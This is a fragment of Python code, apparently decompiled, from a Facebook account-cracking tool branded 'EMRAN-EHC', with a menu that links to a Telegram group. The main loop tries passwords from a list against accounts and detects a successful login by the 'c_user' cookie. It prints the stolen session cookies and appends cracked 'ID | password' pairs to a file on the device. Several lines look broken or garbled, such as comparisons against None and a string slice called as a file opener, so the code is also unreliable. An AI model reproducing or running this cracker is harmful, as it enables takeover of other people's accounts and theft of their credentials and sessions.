...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        _EMRAN_('xdg-open https://t.me/+ff_j-T6-FS9mNTI0')
        return None
    if None == '3':
        _EMRAN_('xdg-open https://t.me/+ff_j-T6-FS9mNTI0')
        return None
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                print('\033[1;32mEMRAN-EHC-OK ]' +cid+ ' | ' +ps+'\033[0;35m')
                print(f"{H}\033[0;35m[🍪]COOKIE :\033[1;32m{coki}")
                cek_apk(session,coki)
                uid('/sdcard/EMRAN-EHC-OK.txt', 'a').write(cid+' | '+ps+'\n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        hahaha()
        sys.stdout.write('\r%s[EMRAN-EHC] \033[1;32m[%s/%s] \033[1;32m[OK-%s] \r'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
